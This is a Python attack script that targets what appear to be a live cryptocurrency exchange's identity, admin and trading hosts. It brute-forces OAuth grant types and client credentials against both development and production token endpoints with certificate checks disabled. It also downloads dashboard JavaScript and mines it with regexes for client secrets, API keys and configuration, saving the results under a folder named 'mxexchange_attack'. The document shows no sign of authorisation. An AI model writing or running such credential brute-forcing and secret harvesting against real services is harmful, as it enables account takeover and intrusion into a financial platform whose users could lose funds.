import requests, json, sys, re, urllib3
urllib3.disable_warnings()
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
T = 15
H = {"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0"}

IDENTITY_HKDEV = "https://identityhkdev.mx.exchange"
IDENTITY_PROD = "https://identity.mx.exchange"

# Known accounts
TEST_EMAIL = "testuser@gmail.com"
TEST_PASS = "TestPass123!@#"

# Confirmed client_ids: spa, mx-mobile, test
# Try ALL grant types for mx-mobile and test

grant_combos = [
    # password grant (ROPC) - direct user login
    {"grant_type": "password", "email": TEST_EMAIL, "password": TEST_PASS, "client_secret": "secret"},
    {"grant_type": "password", "email": TEST_EMAIL, "password": TEST_PASS, "client_secret": ""},
    {"grant_type": "password", "username": TEST_EMAIL, "password": TEST_PASS, "client_secret": "secret"},
    {"grant_type": "password", "username": TEST_EMAIL, "password": TEST_PASS, "client_secret": ""},
    # Custom password with provider (like the spa client)
    {"grant_type": "password", "email": TEST_EMAIL, "token": TEST_PASS, "provider": "local", "code": "", "client_secret": "secret"},
    {"grant_type": "password", "email": TEST_EMAIL, "token": "", "provider": "Email", "code": TEST_PASS, "client_secret": "secret"},
    # device_code
    {"grant_type": "urn:ietf:params:oauth:grant-type:device_code", "client_secret": "secret"},
    {"grant_type": "urn:ietf:params:oauth:grant-type:device_code", "client_secret": ""},
    # client_credentials without secret (public client)
    {"grant_type": "client_credentials", "client_secret": ""},
    {"grant_type": "client_credentials"},
    # implicit (via POST — unusual but some servers accept it)
    {"grant_type": "implicit", "client_secret": "secret"},
    {"grant_type": "implicit", "client_secret": ""},
]

results = {}
for env, base in [("HKDEV", IDENTITY_HKDEV), ("PROD", IDENTITY_PROD)]:
    print(f"\n{'='*60}")
    print(f"  {env}")
    print(f"{'='*60}")
    
    for cid in ["mx-mobile", "test"]:
        print(f"\n  --- client_id: {cid} ---")
        for combo in grant_combos:
            data = {"client_id": cid}
            data.update(combo)
            
            label = f"{combo.get('grant_type','?')}|secret={combo.get('client_secret','?')[:6]}"
            extra_keys = [k for k in combo if k not in ("grant_type", "client_secret")]
            if extra_keys:
                label += "|" + ",".join(extra_keys)
            
            try:
                r = requests.post(f"{base}/connect/token", data=data, headers=H, timeout=T, verify=False)
                
                resp_text = r.text[:300].encode('ascii','replace').decode('ascii')
                
                if r.status_code == 200:
                    print(f"  [!!!] {label} => 200 TOKEN!!!")
                    results[f"{env}_{cid}_{label}"] = r.json()
                elif "unauthorized_client" in r.text:
                    pass  # expected, skip
                elif "invalid_client" in r.text:
                    pass  # no match
                elif "invalid_grant" in r.text:
                    print(f"  [!!] {label} => INVALID_GRANT (client accepted grant but creds wrong!)")
                    results[f"{env}_{cid}_{label}"] = {"error": "invalid_grant", "detail": resp_text}
                elif "Not allowed" in r.text:
                    print(f"  [!] {label} => Not allowed (grant recognized but disabled)")
                else:
                    print(f"  [?] {label} => {r.status_code} {resp_text[:200]}")
            except Exception as e:
                print(f"  [X] {label} => {str(e)[:80]}")

    # Also test spa with password grant using our registered account credentials
    print(f"\n  --- spa password grant with registered account ---")
    password_combos = [
        # Standard ROPC
        {"client_id":"spa","client_secret":"secret","grant_type":"password","username":TEST_EMAIL,"password":TEST_PASS},
        # Custom email/token/provider (like the Angular app sends)
        {"client_id":"spa","client_secret":"secret","grant_type":"password","email":TEST_EMAIL,"token":TEST_PASS,"provider":"local","code":""},
        {"client_id":"spa","client_secret":"secret","grant_type":"password","email":TEST_EMAIL,"token":"","provider":"Email","code":TEST_PASS},
        # External provider simulation
        {"client_id":"spa","client_secret":"secret","grant_type":"external","email":TEST_EMAIL,"token":TEST_PASS,"provider":"local"},
        {"client_id":"spa","client_secret":"secret","grant_type":"urn:ietf:params:oauth:grant-type:token-exchange","subject_token":TEST_PASS,"subject_token_type":"urn:ietf:params:oauth:token-type:access_token"},
    ]
    for combo in password_combos:
        label = f"{combo.get('grant_type','?')}|{[k for k in combo if k not in ('client_id','client_secret','grant_type')]}"
        try:
            r = requests.post(f"{base}/connect/token", data=combo, headers=H, timeout=T, verify=False)
            resp = r.text[:300].encode('ascii','replace').decode('ascii')
            if r.status_code == 200:
                print(f"  [!!!] {label} => 200 TOKEN!!!")
                results[f"{env}_spa_{label}"] = r.json()
            elif "Not allowed" in r.text:
                pass  # known
            elif "unauthorized_client" in r.text:
                pass
            elif "invalid_grant" in r.text:
                print(f"  [!!] {label} => INVALID_GRANT (recognized but creds wrong!)")
                results[f"{env}_spa_{label}"] = {"error": "invalid_grant", "detail": resp}
            else:
                print(f"  [?] {label} => {r.status_code} {resp[:200]}")
        except Exception as e:
            print(f"  [X] {label} => {str(e)[:80]}")


# Phase 2: Fetch admin dashboard main.js 
print(f"\n\n{'='*60}")
print(f"  ADMIN DASHBOARD JS ANALYSIS")
print(f"{'='*60}")

for host in ["admin-hkdev.mx.exchange", "admin.mx.exchange"]:
    base_url = f"https://{host}"
    try:
        r = requests.get(f"{base_url}/main.js", headers={"User-Agent":"Mozilla/5.0"}, timeout=T, verify=False)
        if r.status_code == 200 and len(r.text) > 1000:
            print(f"\n  [{host}] main.js = {len(r.text)} bytes")
            text = r.text
            
            # EXHAUSTIVE search
            patterns = {
                "client_id": r'client_id["\s:=\']+([a-zA-Z0-9._\-]+)',
                "clientId": r'clientId["\s:=\']+([a-zA-Z0-9._\-]+)',
                "client_secret": r'client_secret["\s:=\']+([a-zA-Z0-9._\-!@#$%^&*()+]+)',
                "clientSecret": r'clientSecret["\s:=\']+([a-zA-Z0-9._\-!@#$%^&*()+]+)',
                "stsServer": r'stsServer["\s:=\']+(https?://[a-zA-Z0-9._\-:/]+)',
                "authority": r'(?:authority|issuer)["\s:=\']+(https?://[a-zA-Z0-9._\-:/]+)',
                "identityUrl": r'(?:Identity|identity)[Uu]rl["\s:=\']+(https?://[a-zA-Z0-9._\-:/]+)',
                "apiUrl": r'(?:api|Api)[Uu]rl["\s:=\']+(https?://[a-zA-Z0-9._\-:/]+)',
                "scope": r'(?:scope|scopes)["\s:=\']+([a-zA-Z0-9._\-\s]+)',
                "redirect": r'(?:redirect_uri|redirectUri|postLogoutRedirectUri)["\s:=\']+(https?://[a-zA-Z0-9._\-:/]+)',
                "grant_type": r'grant_type["\s:=\']+([a-zA-Z0-9._\-]+)',
                "secret_key": r'(?:secret|apiKey|api_key|access_key)["\s:=\']+([a-zA-Z0-9._\-!@#$%^&*()+]{6,})',
                "environment": r'(?:environment|env)["\s:=\']+\{([^}]{20,400})\}',
            }
            
            for label, pat in patterns.items():
                matches = re.findall(pat, text)
                if matches:
                    unique = list(set(matches))[:15]
                    for m in unique:
                        clean = m[:200].encode('ascii','replace').decode('ascii')
                        print(f"    {label} = {clean}")
            
            # Save admin main.js for manual analysis
            out = f"c:\\xampp\\htdocs\\pentagi\\mxexchange_attack\\admin_{host.replace('.','_')}_main.js"
            with open(out, "w", encoding="utf-8") as f:
                f.write(text)
            print(f"    Saved to {out}")
            
        else:
            print(f"  [{host}] main.js => {r.status_code}")
    except Exception as e:
        print(f"  [{host}] ERROR: {str(e)[:80]}")

# Phase 3: Try web trading dashboard JS
print(f"\n  --- WEB TRADING DASHBOARD ---")
for host in ["web-hkdev.mx.exchange", "web.mx.exchange"]:
    try:
        base_url = f"https://{host}"
        r = requests.get(f"{base_url}/", headers={"User-Agent":"Mozilla/5.0"}, timeout=T, verify=False)
        if r.status_code == 200:
            scripts = re.findall(r'src="([^"]*\.js[^"]*)"', r.text)
            main_scripts = [s for s in scripts if "main" in s.lower() or "app" in s.lower() or "runtime" not in s.lower()]
            print(f"  [{host}] Scripts: {[s[:50] for s in scripts]}")
            for s in main_scripts[:3]:
                url = f"{base_url}{s}" if s.startswith("/") else s
                r2 = requests.get(url, headers={"User-Agent":"Mozilla/5.0"}, timeout=T, verify=False)
                if r2.status_code == 200 and len(r2.text) > 5000:
                    # Search for configs
                    for pat, label in [
                        (r'client_id["\s:=\']+([a-zA-Z0-9._\-]+)', "client_id"),
                        (r'client_secret["\s:=\']+([a-zA-Z0-9._\-!@#$%^&*()+]+)', "client_secret"),
                    ]:
                        matches = re.findall(pat, r2.text)
                        if matches:
                            print(f"    [{s[:30]}] {label} = {list(set(matches))[:5]}")
    except Exception as e:
        print(f"  [{host}] ERROR: {str(e)[:80]}")


# Save results
with open(r"c:\xampp\htdocs\pentagi\mxexchange_attack\grant_brute_results.json", "w") as f:
    json.dump(results, f, indent=2, ensure_ascii=True, default=str)

print(f"\n\n{'='*60}")
print(f"TOTAL INTERESTING RESULTS: {len(results)}")
for k, v in results.items():
    print(f"  {k}")
    print(f"    => {json.dumps(v, ensure_ascii=True)[:200]}")
print("=" * 60)
